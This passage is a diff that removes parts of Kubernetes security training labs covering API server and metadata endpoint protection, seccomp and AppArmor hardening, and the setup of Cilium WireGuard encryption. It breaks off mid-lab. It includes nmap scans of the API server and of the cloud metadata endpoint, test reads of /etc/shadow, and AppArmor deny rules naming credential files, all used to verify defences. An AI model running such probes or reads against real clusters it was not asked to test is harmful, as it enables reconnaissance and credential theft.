-kubectl wait --for=condition=Ready pod/network-scanner --timeout=60s
-
-# Scan for open ports on API server
-kubectl exec network-scanner -- nmap -p 6443 kubernetes.default.svc.cluster.local
-
-# Scan for metadata endpoints
-kubectl exec network-scanner -- nmap -p 80 169.254.169.254 || echo "Metadata endpoint scan blocked"
-
-    Generate security report:
-
-# Create comprehensive security report
-cat > generate-security-report.sh << 'EOF'
-#!/bin/bash
-
-REPORT_FILE="kubernetes-security-report-$(date +%Y%m%d-%H%M%S).txt"
-
-echo "Kubernetes Cluster Security Report" > $REPORT_FILE
-echo "Generated on: $(date)" >> $REPORT_FILE
-echo "========================================" >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "1. API Server Configuration:" >> $REPORT_FILE
-kubectl get pods -n kube-system | grep apiserver >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "2. Network Policies:" >> $REPORT_FILE
-kubectl get networkpolicy --all-namespaces >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "3. Security Contexts:" >> $REPORT_FILE
-kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.securityContext.runAsNonRoot}{"\n"}{end}' | grep -v "^$" >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "4. Service Accounts:" >> $REPORT_FILE
-kubectl get serviceaccounts --all-namespaces >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "5. RBAC Policies:" >> $REPORT_FILE
-kubectl get clusterroles | head -10 >> $REPORT_FILE
-echo "" >> $REPORT_FILE
-
-echo "Security report generated: $REPORT_FILE"
-cat $REPORT_FILE
-EOF
-
-chmod +x generate-security-report.sh
-./generate-security-report.sh
-
-Troubleshooting Common Issues
-Issue 1: API Server Not Restarting After Configuration Changes
-
-Problem: API server pod doesn't restart after modifying configuration files.
-
-Solution:
-
-# Check API server pod status
-kubectl get pods -n kube-system | grep apiserver
-
-# If pod is not restarting, manually delete it
-kubectl delete pod -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}')
-
-# Check kubelet logs for errors
-sudo journalctl -u kubelet -f
-
-Issue 2: Network Policies Not Taking Effect
-
-Problem: Network policies are created but not enforcing restrictions.
-
-Solution:
-
-# Verify CNI plugin supports NetworkPolicies
-kubectl get nodes -o wide
-
-# Check if network plugin is running
-kubectl get pods -n kube-system | grep -E "(calico|weave|flannel)"
-
-# Restart network plugin pods if necessary
-kubectl delete pods -n kube-system -l k8s-app=calico-node
-
-Issue 3: DNS Configuration Not Applied
-
-Problem: CoreDNS configuration changes are not taking effect.
-
-Solution:
-
-# Check CoreDNS configuration
-kubectl get configmap coredns -n kube-system -o yaml
-
-# Restart CoreDNS deployment
-kubectl rollout restart deployment/coredns -n kube-system
-
-# Verify DNS resolution
-kubectl exec secure-test-pod -- nslookup kubernetes.default.svc.cluster.local
-
-Cleanup
-
-To clean up the lab environment:
-
-# Remove test pods
-kubectl delete pod metadata-test-pod api-test-pod secure-test-pod network-scanner cross-namespace-test --ignore-not-found=true
-
-# Remove test namespace
-kubectl delete namespace test-namespace --ignore-not-found=true
-
-# Remove network policies (optional - keep for production)
-# kubectl delete networkpolicy block-metadata-endpoint api-server-access-policy -n kube-system
-
-# Remove test scripts
-rm -f security-test.sh generate-security-report.sh kubernetes-security-report-*.txt
-
-Conclusion
-
-In this lab, you have successfully implemented comprehensive endpoint security measures for a Kubernetes cluster. Here's what you accomplished:
-
-Key Achievements:
-
-• API Server Security: Configured the Kubernetes API server with access restrictions and network policies to limit connectivity to trusted IP ranges and authorized components.
-
-• Metadata Endpoint Protection: Implemented multiple layers of security to prevent pods from accessing cloud metadata endpoints, including network policies and DNS-level blocking.
-
-• Security Validation: Used various network diagnostic tools to test and verify the effectiveness of implemented security measures.
-
-• Comprehensive Testing: Created automated security tests to validate endpoint security configurations and generate security reports.
-
-Why This Matters:
-
-Securing cluster endpoints is crucial for maintaining the overall security posture of Kubernetes environments. The techniques learned in this lab help prevent:
-
-    Unauthorized access to the Kubernetes API server
-    Metadata endpoint attacks that could expose sensitive cloud credentials
-    Lateral movement within the cluster network
-    Data exfiltration through unsecured network channels
-
-Real-World Applications:
-
-These security measures are essential for:
-
-    Production Kubernetes deployments in cloud environments
-    Multi-tenant clusters where workload isolation is critical
-    Compliance with security frameworks and regulations
-    Protecting against common Kubernetes attack vectors
-
-The skills developed in this lab directly apply to the Certified Kubernetes Security Specialist (CKS) certification and are fundamental for anyone responsible for securing Kubernetes clusters in production environments.
-
-Next Steps:
-
-Consider exploring additional security topics such as:
-
-    Pod Security Standards and admission controllers
-    Secrets management and encryption at rest
-    Runtime security monitoring and threat detection
-    Supply chain security for container images
-
-
-
-
-
-
-Lab 12: Kernel Hardening Tools Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Understand the fundamentals of kernel hardening in Kubernetes environments • Implement seccomp profiles to restrict system calls for containerized applications • Configure and apply AppArmor profiles to limit process capabilities • Verify that applications comply with security hardening profiles • Troubleshoot common issues related to kernel hardening implementations • Demonstrate practical knowledge of security controls required for CKS certification
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with Linux command line operations • Knowledge of container security fundamentals • Understanding of YAML configuration files • Basic knowledge of Linux security mechanisms
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ • Docker runtime pre-installed • kubectl configured and ready to use • AppArmor utilities pre-installed • Sample applications for testing
-Task 1: Understanding and Implementing Seccomp Profiles
-Subtask 1.1: Explore Current Seccomp Status
-
-First, let's examine the current seccomp configuration in your cluster.
-
-    Check if seccomp is enabled in your cluster:
-
-kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.containerRuntimeVersion}'
-
-    Verify seccomp support:
-
-grep -i seccomp /boot/config-$(uname -r)
-
-    Check available seccomp profiles:
-
-ls -la /var/lib/kubelet/seccomp/
-
-Subtask 1.2: Create a Custom Seccomp Profile
-
-    Create a directory for seccomp profiles:
-
-sudo mkdir -p /var/lib/kubelet/seccomp/profiles
-
-    Create a restrictive seccomp profile:
-
-cat << 'EOF' | sudo tee /var/lib/kubelet/seccomp/profiles/restricted-profile.json
-{
-    "defaultAction": "SCMP_ACT_ERRNO",
-    "architectures": [
-        "SCMP_ARCH_X86_64",
-        "SCMP_ARCH_X86",
-        "SCMP_ARCH_X32"
-    ],
-    "syscalls": [
-        {
-            "names": [
-                "accept",
-                "accept4",
-                "access",
-                "arch_prctl",
-                "bind",
-                "brk",
-                "clone",
-                "close",
-                "connect",
-                "dup",
-                "dup2",
-                "epoll_create",
-                "epoll_ctl",
-                "epoll_wait",
-                "exit",
-                "exit_group",
-                "fchdir",
-                "fchmod",
-                "fchown",
-                "fcntl",
-                "fstat",
-                "fstatfs",
-                "futex",
-                "getcwd",
-                "getdents",
-                "getgid",
-                "getpeername",
-                "getpid",
-                "getppid",
-                "getrandom",
-                "getsockname",
-                "getsockopt",
-                "getuid",
-                "listen",
-                "lseek",
-                "mmap",
-                "mprotect",
-                "munmap",
-                "nanosleep",
-                "open",
-                "openat",
-                "poll",
-                "read",
-                "readlink",
-                "rt_sigaction",
-                "rt_sigprocmask",
-                "rt_sigreturn",
-                "sched_getaffinity",
-                "select",
-                "set_robust_list",
-                "setsockopt",
-                "socket",
-                "stat",
-                "statfs",
-                "write"
-            ],
-            "action": "SCMP_ACT_ALLOW"
-        }
-    ]
-}
-EOF
-
-    Verify the profile was created:
-
-sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .
-
-Subtask 1.3: Deploy a Pod with Seccomp Profile
-
-    Create a test application without seccomp:
-
-cat << 'EOF' > test-app-no-seccomp.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: test-app-no-seccomp
-  labels:
-    app: test-seccomp
-spec:
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do echo 'Running without seccomp'; sleep 30; done"]
-EOF
-
-    Deploy the pod:
-
-kubectl apply -f test-app-no-seccomp.yaml
-
-    Create the same application with seccomp profile:
-
-cat << 'EOF' > test-app-with-seccomp.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: test-app-with-seccomp
-  labels:
-    app: test-seccomp
-  annotations:
-    seccomp.security.alpha.kubernetes.io/pod: localhost/restricted-profile.json
-spec:
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do echo 'Running with seccomp'; sleep 30; done"]
-  securityContext:
-    seccompProfile:
-      type: Localhost
-      localhostProfile: restricted-profile.json
-EOF
-
-    Deploy the pod with seccomp:
-
-kubectl apply -f test-app-with-seccomp.yaml
-
-Subtask 1.4: Test Seccomp Restrictions
-
-    Check both pods are running:
-
-kubectl get pods -l app=test-seccomp
-
-    Test system calls on the pod without seccomp:
-
-kubectl exec -it test-app-no-seccomp -- strace -c -f -S name nginx -g 'daemon off;' 2>&1 | head -20
-
-    Test system calls on the pod with seccomp (this should show restrictions):
-
-kubectl exec -it test-app-with-seccomp -- ls /proc/self/status | grep Seccomp
-
-    Verify seccomp is active:
-
-kubectl exec -it test-app-with-seccomp -- cat /proc/self/status | grep -i seccomp
-
-Task 2: Implementing AppArmor Profiles
-Subtask 2.1: Check AppArmor Status
-
-    Verify AppArmor is enabled:
-
-sudo aa-status
-
-    Check AppArmor module status:
-
-sudo apparmor_status
-
-    List current AppArmor profiles:
-
-sudo aa-status --enabled
-
-Subtask 2.2: Create a Custom AppArmor Profile
-
-    Create an AppArmor profile for our application:
-
-cat << 'EOF' | sudo tee /etc/apparmor.d/k8s-restricted-app
-#include <tunables/global>
-
-profile k8s-restricted-app flags=(attach_disconnected,mediate_deleted) {
-  #include <abstractions/base>
-  
-  # Allow basic file operations
-  /bin/sh ix,
-  /bin/dash ix,
-  /bin/bash ix,
-  /usr/bin/env ix,
-  
-  # Allow reading from specific directories
-  /etc/passwd r,
-  /etc/group r,
-  /etc/hostname r,
-  /etc/hosts r,
-  /etc/localtime r,
-  /etc/nsswitch.conf r,
-  /etc/resolv.conf r,
-  
-  # Allow access to proc filesystem (limited)
-  /proc/*/stat r,
-  /proc/*/status r,
-  /proc/sys/kernel/hostname r,
-  
-  # Allow temporary file operations
-  /tmp/** rw,
-  /var/tmp/** rw,
-  
-  # Allow network operations
-  network inet tcp,
-  network inet udp,
-  network inet6 tcp,
-  network inet6 udp,
-  
-  # Deny dangerous capabilities
-  deny capability sys_admin,
-  deny capability sys_module,
-  deny capability sys_rawio,
-  deny capability sys_ptrace,
-  deny capability dac_override,
-  
-  # Deny access to sensitive files
-  deny /etc/shadow r,
-  deny /etc/sudoers r,
-  deny /root/** rw,
-  deny /home/*/.ssh/** rw,
-  
-  # Allow specific application files
-  /usr/share/nginx/** r,
-  /var/log/nginx/** w,
-  /var/cache/nginx/** rw,
-  /run/nginx.pid w,
-  
-  # Allow stdout/stderr
-  /dev/stdout w,
-  /dev/stderr w,
-}
-EOF
-
-    Load the AppArmor profile:
-
-sudo apparmor_parser -r /etc/apparmor.d/k8s-restricted-app
-
-    Verify the profile is loaded:
-
-sudo aa-status | grep k8s-restricted-app
-
-Subtask 2.3: Deploy Pod with AppArmor Profile
-
-    Create a pod without AppArmor:
-
-cat << 'EOF' > test-app-no-apparmor.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: test-app-no-apparmor
-  labels:
-    app: test-apparmor
-spec:
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: false
-      runAsUser: 0
-EOF
-
-    Deploy the pod:
-
-kubectl apply -f test-app-no-apparmor.yaml
-
-    Create a pod with AppArmor profile:
-
-cat << 'EOF' > test-app-with-apparmor.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: test-app-with-apparmor
-  labels:
-    app: test-apparmor
-  annotations:
-    container.apparmor.security.beta.kubernetes.io/test-container: localhost/k8s-restricted-app
-spec:
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: false
-      runAsUser: 0
-EOF
-
-    Deploy the pod with AppArmor:
-
-kubectl apply -f test-app-with-apparmor.yaml
-
-Subtask 2.4: Test AppArmor Restrictions
-
-    Check both pods are running:
-
-kubectl get pods -l app=test-apparmor
-
-    Test file access on pod without AppArmor:
-
-kubectl exec -it test-app-no-apparmor -- ls -la /etc/shadow
-kubectl exec -it test-app-no-apparmor -- cat /etc/passwd
-
-    Test file access on pod with AppArmor (should be restricted):
-
-kubectl exec -it test-app-with-apparmor -- ls -la /etc/shadow
-kubectl exec -it test-app-with-apparmor -- cat /etc/passwd
-
-    Verify AppArmor profile is active:
-
-kubectl exec -it test-app-with-apparmor -- cat /proc/self/attr/current
-
-Task 3: Combining Seccomp and AppArmor for Enhanced Security
-Subtask 3.1: Create a Hardened Application Deployment
-
-    Create a comprehensive hardened deployment:
-
-cat << 'EOF' > hardened-app-deployment.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: hardened-nginx
-  labels:
-    app: hardened-nginx
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: hardened-nginx
-  template:
-    metadata:
-      labels:
-        app: hardened-nginx
-      annotations:
-        container.apparmor.security.beta.kubernetes.io/nginx: localhost/k8s-restricted-app
-    spec:
-      containers:
-      - name: nginx
-        image: nginx:1.21
-        ports:
-        - containerPort: 80
-        securityContext:
-          allowPrivilegeEscalation: false
-          runAsNonRoot: false
-          runAsUser: 101
-          runAsGroup: 101
-          readOnlyRootFilesystem: true
-          seccompProfile:
-            type: Localhost
-            localhostProfile: restricted-profile.json
-          capabilities:
-            drop:
-            - ALL
-            add:
-            - NET_BIND_SERVICE
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-        - name: var-cache-nginx
-          mountPath: /var/cache/nginx
-        - name: var-run
-          mountPath: /var/run
-        resources:
-          limits:
-            memory: "128Mi"
-            cpu: "100m"
-          requests:
-            memory: "64Mi"
-            cpu: "50m"
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      - name: var-cache-nginx
-        emptyDir: {}
-      - name: var-run
-        emptyDir: {}
-EOF
-
-    Deploy the hardened application:
-
-kubectl apply -f hardened-app-deployment.yaml
-
-    Create a service for the hardened application:
-
-cat << 'EOF' > hardened-app-service.yaml
-apiVersion: v1
-kind: Service
-metadata:
-  name: hardened-nginx-service
-spec:
-  selector:
-    app: hardened-nginx
-  ports:
-  - protocol: TCP
-    port: 80
-    targetPort: 80
-  type: ClusterIP
-EOF
-
-    Deploy the service:
-
-kubectl apply -f hardened-app-service.yaml
-
-Subtask 3.2: Verify Hardened Application Functionality
-
-    Check deployment status:
-
-kubectl get deployment hardened-nginx
-kubectl get pods -l app=hardened-nginx
-
-    Test application functionality:
-
-kubectl run test-client --image=busybox --rm -it --restart=Never -- wget -qO- hardened-nginx-service
-
-    Verify security contexts are applied:
-
-POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
-kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -E "(Uid|Gid|Seccomp)"
-kubectl exec -it $POD_NAME -- cat /proc/self/attr/current
-
-Subtask 3.3: Test Security Restrictions
-
-    Test file system restrictions:
-
-kubectl exec -it $POD_NAME -- touch /test-file
-kubectl exec -it $POD_NAME -- ls -la /etc/shadow
-
-    Test capability restrictions:
-
-kubectl exec -it $POD_NAME -- ping -c 1 8.8.8.8
-kubectl exec -it $POD_NAME -- netstat -tulpn
-
-    Monitor AppArmor violations:
-
-sudo dmesg | grep -i apparmor | tail -10
-
-Task 4: Verification and Monitoring
-Subtask 4.1: Create Monitoring Scripts
-
-    Create a security verification script:
-
-cat << 'EOF' > verify-security.sh
-#!/bin/bash
-
-echo "=== Kubernetes Security Verification ==="
-echo
-
-echo "1. Checking Seccomp profiles:"
-ls -la /var/lib/kubelet/seccomp/profiles/
-echo
-
-echo "2. Checking AppArmor profiles:"
-sudo aa-status | grep k8s-restricted-app
-echo
-
-echo "3. Checking hardened pods:"
-kubectl get pods -l app=hardened-nginx -o wide
-echo
-
-echo "4. Verifying security contexts:"
-POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
-if [ ! -z "$POD_NAME" ]; then
-    echo "Pod: $POD_NAME"
-    kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -E "(Uid|Gid|Seccomp)" || true
-    kubectl exec -it $POD_NAME -- cat /proc/self/attr/current || true
-fi
-echo
-
-echo "5. Checking for security violations:"
-sudo dmesg | grep -i "apparmor\|seccomp" | tail -5
-echo
-
-echo "=== Verification Complete ==="
-EOF
-
-chmod +x verify-security.sh
-
-    Run the verification script:
-
-./verify-security.sh
-
-Subtask 4.2: Performance Impact Assessment
-
-    Create a performance test script:
-
-cat << 'EOF' > performance-test.sh
-#!/bin/bash
-
-echo "=== Performance Impact Assessment ==="
-echo
-
-echo "Testing hardened application response time:"
-for i in {1..5}; do
-    echo "Test $i:"
-    time kubectl run test-perf-$i --image=busybox --rm --restart=Never -- wget -qO- hardened-nginx-service
-    echo
-done
-
-echo "=== Performance Test Complete ==="
-EOF
-
-chmod +x performance-test.sh
-
-    Run the performance test:
-
-./performance-test.sh
-
-Subtask 4.3: Security Compliance Check
-
-    Create a compliance verification script:
-
-cat << 'EOF' > compliance-check.sh
-#!/bin/bash
-
-echo "=== Security Compliance Check ==="
-echo
-
-PASS=0
-FAIL=0
-
-# Check if seccomp is applied
-echo "Checking Seccomp compliance..."
-POD_NAME=$(kubectl get pods -l app=hardened-nginx -o jsonpath='{.items[0].metadata.name}')
-if kubectl exec -it $POD_NAME -- cat /proc/self/status | grep -q "Seccomp.*2"; then
-    echo "✓ Seccomp profile is active"
-    ((PASS++))
-else
-    echo "✗ Seccomp profile is not active"
-    ((FAIL++))
-fi
-
-# Check if AppArmor is applied
-echo "Checking AppArmor compliance..."
-if kubectl exec -it $POD_NAME -- cat /proc/self/attr/current | grep -q "k8s-restricted-app"; then
-    echo "✓ AppArmor profile is active"
-    ((PASS++))
-else
-    echo "✗ AppArmor profile is not active"
-    ((FAIL++))
-fi
-
-# Check if running as non-root
-echo "Checking user context..."
-if kubectl exec -it $POD_NAME -- id | grep -q "uid=101"; then
-    echo "✓ Running as non-root user"
-    ((PASS++))
-else
-    echo "✗ Not running as expected non-root user"
-    ((FAIL++))
-fi
-
-# Check if capabilities are dropped
-echo "Checking capability restrictions..."
-if kubectl get pod $POD_NAME -o yaml | grep -q "drop.*ALL"; then
-    echo "✓ Capabilities properly restricted"
-    ((PASS++))
-else
-    echo "✗ Capabilities not properly restricted"
-    ((FAIL++))
-fi
-
-echo
-echo "=== Compliance Summary ==="
-echo "Passed: $PASS"
-echo "Failed: $FAIL"
-echo "Total Score: $(( PASS * 100 / (PASS + FAIL) ))%"
-echo
-EOF
-
-chmod +x compliance-check.sh
-
-    Run the compliance check:
-
-./compliance-check.sh
-
-Troubleshooting Common Issues
-Issue 1: Seccomp Profile Not Loading
-
-Problem: Pod fails to start with seccomp profile errors.
-
-Solution:
-
-# Check if the profile exists
-sudo ls -la /var/lib/kubelet/seccomp/profiles/
-
-# Validate JSON syntax
-sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .
-
-# Check kubelet logs
-sudo journalctl -u kubelet | grep seccomp
-
-Issue 2: AppArmor Profile Conflicts
-
-Problem: AppArmor denials preventing application from running.
-
-Solution:
-
-# Check AppArmor logs
-sudo dmesg | grep -i apparmor
-
-# Put profile in complain mode for debugging
-sudo aa-complain k8s-restricted-app
-
-# Generate profile based on actual usage
-sudo aa-genprof /usr/sbin/nginx
-
-Issue 3: Pod Security Context Issues
-
-Problem: Pods failing due to security context restrictions.
-
-Solution:
-
-# Check pod events
-kubectl describe pod $POD_NAME
-
-# Verify security context settings
-kubectl get pod $POD_NAME -o yaml | grep -A 10 securityContext
-
-# Test with relaxed settings first
-kubectl patch deployment hardened-nginx -p '{"spec":{"template":{"spec":{"securityContext":{"runAsNonRoot":false}}}}}'
-
-Cleanup
-
-To clean up the lab environment:
-
-# Delete test pods and deployments
-kubectl delete pod test-app-no-seccomp test-app-with-seccomp test-app-no-apparmor test-app-with-apparmor
-kubectl delete deployment hardened-nginx
-kubectl delete service hardened-nginx-service
-
-# Remove AppArmor profile
-sudo aa-disable k8s-restricted-app
-sudo rm /etc/apparmor.d/k8s-restricted-app
-
-# Remove seccomp profile
-sudo rm /var/lib/kubelet/seccomp/profiles/restricted-profile.json
-
-# Remove scripts
-rm -f verify-security.sh performance-test.sh compliance-check.sh
-rm -f *.yaml
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Implemented seccomp profiles to restrict system calls and reduce the attack surface of containerized applications • Configured AppArmor profiles to enforce mandatory access controls and limit process capabilities • Combined multiple security mechanisms to create a defense-in-depth approach for Kubernetes workloads • Verified security compliance through automated testing and monitoring scripts • Gained practical experience with kernel hardening tools essential for the CKS certification
-
-Why This Matters: Kernel hardening is a critical component of container security that helps prevent privilege escalation attacks, limits the impact of container breakouts, and ensures compliance with security standards. The skills you've developed in this lab are directly applicable to real-world Kubernetes security implementations and are essential for maintaining secure production environments.
-
-Key Takeaways:
-
-    Seccomp profiles provide fine-grained control over system calls
-    AppArmor profiles enforce mandatory access controls at the kernel level
-    Combining multiple security mechanisms creates robust defense layers
-    Regular verification and monitoring ensure ongoing security compliance
-    Proper testing helps balance security with application functionality
-
-These kernel hardening techniques form the foundation of advanced Kubernetes security practices and are crucial for anyone pursuing the Certified Kubernetes Security Specialist certification.
-
-
-
-
-
-
-
-
-
-
-Lab 13: Managing Pod-to-Pod Encryption
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Deploy and configure Cilium service mesh for Pod-to-Pod encryption • Implement mutual TLS (mTLS) authentication between services • Configure network policies to enforce encrypted communication • Monitor and verify encrypted traffic using Cilium's built-in observability tools • Troubleshoot common encryption and connectivity issues • Understand the security benefits of service mesh encryption
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with kubectl command-line tool • Knowledge of networking concepts (TCP/IP, TLS/SSL) • Understanding of YAML configuration files • Basic Linux command-line skills
-Lab Environment
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
-
-Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-installed • A 3-node Kubernetes cluster (1 control plane, 2 worker nodes) • Helm package manager • All necessary networking tools
-Task 1: Deploy Cilium Service Mesh
-Subtask 1.1: Verify Cluster Status
-
-First, let's ensure your Kubernetes cluster is ready and check the current networking setup.
-
-# Check cluster nodes
-kubectl get nodes -o wide
-
-# Verify cluster is ready
-kubectl cluster-info
-
-# Check current CNI (Container Network Interface)
-kubectl get pods -n kube-system | grep -E "(cilium|calico|flannel|weave)"
-
-Subtask 1.2: Install Cilium CLI
-
-Install the Cilium command-line interface tool to manage Cilium operations.
-
-# Download and install Cilium CLI
-CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
-CLI_ARCH=amd64
-if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi
-curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
-sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
-sudo tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
-rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
-
-# Verify installation
-cilium version --client
-
-Subtask 1.3: Install Cilium with Encryption
-
-Deploy Cilium with WireGuard encryption enabled for Pod-to-Pod communication.
-
-# Install Cilium with WireGuard encryption
-cilium install \
-  --encryption=wireguard \
-  --enable-l7-proxy=true \
-  --enable-hubble-relay=true \
-  --enable-hubble-ui=true
-
-# Wait for Cilium to be ready
-cilium status --wait
-
-# Verify Cilium installation
-kubectl get pods -n kube-system -l k8s-app=cilium
-
-Subtask 1.4: Enable Hubble Observability
-
-Hubble provides deep visibility into network traffic and security policies.
-
-# Enable Hubble UI for traffic monitoring
-cilium hubble enable --ui
-
-# Wait for Hubble to be ready
-kubectl wait --for=condition=ready pod -l k8s-app=hubble-ui -n kube-system --timeout=300s
-
-# Verify Hubble installation
-kubectl get pods -n kube-system -l k8s-app=hubble-relay
-kubectl get pods -n kube-system -l k8s-app=hubble-ui
-
-Task 2: Configure mTLS for Services
-Subtask 2.1: Create Test Applications
-
-Deploy sample applications to demonstrate encrypted communication.
-
-# Create a namespace for our test applications
-kubectl create namespace secure-apps
-
-# Deploy a web server application
-cat << 'EOF' > web-server.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: web-server
-  namespace: secure-apps
-  labels:
-    app: web-server
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: web-server
-  template:
-    metadata:
-      labels:
-        app: web-server
-    spec:
-      containers:
-      - name: web-server
-        image: nginx:1.21
-        ports:
-        - containerPort: 80
-        resources:
-          requests:
-            memory: "64Mi"
-            cpu: "50m"
-          limits:
-            memory: "128Mi"
-            cpu: "100m"
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: web-server-service
-  namespace: secure-apps
-spec:
-  selector:
-    app: web-server
-  ports:
-  - port: 80
-    targetPort: 80
-  type: ClusterIP
-EOF
-
-kubectl apply -f web-server.yaml
-
-# Deploy a client application
-cat << 'EOF' > client-app.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: client-app
-  namespace: secure-apps
-  labels:
-    app: client-app
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: client-app
-  template:
-    metadata:
-      labels:
-        app: client-app
-    spec:
-      containers:
-      - name: client-app
-        image: curlimages/curl:7.85.0
-        command: ["/bin/sh"]
-        args: ["-c", "while true; do sleep 30; done"]
-        resources:
-          requests:
-            memory: "32Mi"
-            cpu: "25m"
-          limits:
-            memory: "64Mi"
-            cpu: "50m"
-EOF
-
-kubectl apply -f client-app.yaml
-
-Subtask 2.2: Verify Application Deployment
-
-# Check if applications are running
-kubectl get pods -n secure-apps
-
-# Wait for all pods to be ready
-kubectl wait --for=condition=ready pod -l app=web-server -n secure-apps --timeout=300s
-kubectl wait --for=condition=ready pod -l app=client-app -n secure-apps --timeout=300s
-
-# Test basic connectivity
-CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
-kubectl exec -it $CLIENT_POD -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local
-
-Subtask 2.3: Configure Network Policies for Encryption
-
-Create Cilium Network Policies to enforce encrypted communication and implement mTLS.
-
-# Create a Cilium Network Policy for encrypted communication
-cat << 'EOF' > encryption-policy.yaml
-apiVersion: "cilium.io/v2"
-kind: CiliumNetworkPolicy
-metadata:
-  name: secure-web-server-policy
-  namespace: secure-apps
-spec:
-  endpointSelector:
-    matchLabels:
-      app: web-server
-  ingress:
-  - fromEndpoints:
-    - matchLabels:
-        app: client-app
-    toPorts:
-    - ports:
-      - port: "80"
-        protocol: TCP
-      rules:
-        http:
-        - method: "GET"
-  egress:
-  - toEndpoints:
-    - matchLabels:
-        k8s:io.kubernetes.pod.namespace: kube-system
----
-apiVersion: "cilium.io/v2"
-kind: CiliumNetworkPolicy
-metadata:
-  name: secure-client-policy
-  namespace: secure-apps
-spec:
-  endpointSelector:
-    matchLabels:
-      app: client-app
-  egress:
-  - toEndpoints:
-    - matchLabels:
-        app: web-server
-    toPorts:
-    - ports:
-      - port: "80"
-        protocol: TCP
-  - toEndpoints:
-    - matchLabels:
-        k8s:io.kubernetes.pod.namespace: kube-system
-  - toFQDNs:
-    - matchName: "web-server-service.secure-apps.svc.cluster.local"
-EOF
-
-kubectl apply -f encryption-policy.yaml
-
-Subtask 2.4: Enable L7 Policy Enforcement
-
-Configure Layer 7 (application layer) policy enforcement for enhanced security.
-
-# Create an L7 policy with authentication requirements
-cat << 'EOF' > l7-auth-policy.yaml
-apiVersion: "cilium.io/v2"
-kind: CiliumNetworkPolicy
-metadata:
-  name: l7-auth-policy
-  namespace: secure-apps
-spec:
-  endpointSelector:
-    matchLabels:
-      app: web-server
-  ingress:
-  - fromEndpoints:
-    - matchLabels:
-        app: client-app
-    toPorts:
-    - ports:
-      - port: "80"
-        protocol: TCP
-      rules:
-        http:
-        - method: "GET"
-          path: "/"
-        - method: "GET"
-          path: "/health"
-      terminatingTLS:
-        secret:
-          name: web-server-tls
-          namespace: secure-apps
-      originatingTLS:
-        secret:
-          name: client-tls
-          namespace: secure-apps
-EOF
-
-# Note: We'll create the TLS secrets in the next subtask
-
-Subtask 2.5: Create TLS Certificates for mTLS
-
-Generate self-signed certificates for mutual TLS authentication.
-
-# Create a directory for certificates
-mkdir -p /tmp/certs
-cd /tmp/certs
-
-# Generate CA private key
-openssl genrsa -out ca-key.pem 4096
-
-# Generate CA certificate
-openssl req -new -x509 -days 365 -key ca-key.pem -sha256 -out ca.pem -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=Lab CA"
-
-# Generate server private key
